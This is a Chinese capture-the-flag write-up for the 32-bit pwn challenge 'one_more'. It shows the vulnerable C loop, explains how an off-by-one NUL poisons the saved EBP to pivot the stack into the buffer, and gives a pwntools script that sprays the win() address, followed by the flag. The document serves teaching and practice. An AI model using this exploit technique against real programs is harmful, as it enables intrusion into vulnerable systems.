# one_more

## 题目简述

目标是 32 位 i386 ELF，无 PIE、无 Canary、NX 开启。`vuln()` 在 120 字节栈缓冲区上循环 `i <= BUF_SIZE`，恰好多复制一个字节。输入来自 `argv[1]`，因此第 121 个被复制的字节是 C 字符串结尾的 `\0`。这个 off-by-one 不能直接覆盖完整返回地址，却能把保存的 EBP 低字节清零，并在调用者返回时把栈迁移进受控缓冲区。

## 解题过程

漏洞代码为：

```c
#define BUF_SIZE 120

void vuln(char *str) {
    char buffer[BUF_SIZE];
    for (i = 0; i <= BUF_SIZE; i++) {
        buffer[i] = str[i];
    }
}
```

合法索引只有 $0\ldots119$，但循环还会执行 `buffer[120] = str[120]`。当 `argv[1]` 恰好包含 120 个字节时，`str[120]` 是终止 NUL，于是保存 EBP 的最低字节被改为 0。

`vuln()` 自己执行 `leave; ret` 时，会弹出这个被污染的 EBP 返回 `main()`；随后 `main()` 的 `leave; ret` 使用错误 EBP，把 ESP 指向当前栈页中一个低字节对齐到 `0x00` 的地址。该地址有机会落入尚未被覆盖的 `buffer` 区域，下一次 `ret` 就从缓冲区取控制流地址。

程序内置 `win()`，会读取并打印 `flag.txt`；无 PIE 使其地址固定。因为 ASLR 会改变栈地址的低 8 位布局，无法仅凭一个精确槽位保证落点，官方解法用 `win` 地址重复填满 120 字节：

```python
from pwn import *

elf = ELF("./chall")
payload = p32(elf.sym["win"]) * 30
assert len(payload) == 120

# 本地：process([elf.path, payload])
# 远程服务的 wrapper 会把收到的一行作为 argv[1]
io.sendline(payload)
io.interactive()
```

无论污染后的 EBP 让 `ret` 落到缓冲区中的哪个 4 字节对齐位置，重复地址都提高了命中 `win()` 的概率。官方注释也说明该利用可能需要尝试数次；这不是网络不稳定，而是单字节栈迁移对随机栈布局的概率性依赖。

成功后输出：

```text
shellmates{0ne_Byt3_caN_C4uS3_4_l0T_oF_dAmAg3}
```

## 方法总结

- 核心技巧：用 off-by-one NUL 覆盖保存 EBP 的低字节，在上层函数 epilogue 触发栈迁移，再 ret2win。
- 识别信号：固定长度复制写成 `<=`、输入恰好由 C 字符串终止、32 位栈帧紧邻缓冲区时，应检查 frame-pointer poisoning，而不是只寻找完整 RIP/EIP 覆盖。
- 复用要点：重复地址是一种概率性 landing pad；必须确认 `win` 地址本身不含会截断 `argv` 的 NUL 字节，并保留对目标编译器栈布局的验证。
